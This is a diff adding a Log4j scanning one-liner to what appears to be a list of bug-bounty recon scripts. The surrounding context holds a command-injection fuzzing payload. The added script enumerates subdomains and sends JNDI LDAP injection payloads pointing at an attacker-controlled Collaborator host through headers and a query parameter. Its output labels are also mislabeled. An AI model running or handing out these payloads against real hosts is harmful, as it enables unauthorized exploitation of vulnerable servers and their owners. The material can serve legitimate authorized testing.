@@ -127,5 +127,10 @@ cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fu
 ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 ```
 
+**Log4j**
+
+```
+subfinder -d example.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
+```
 
 **More Scripts Coming Sooon.....**
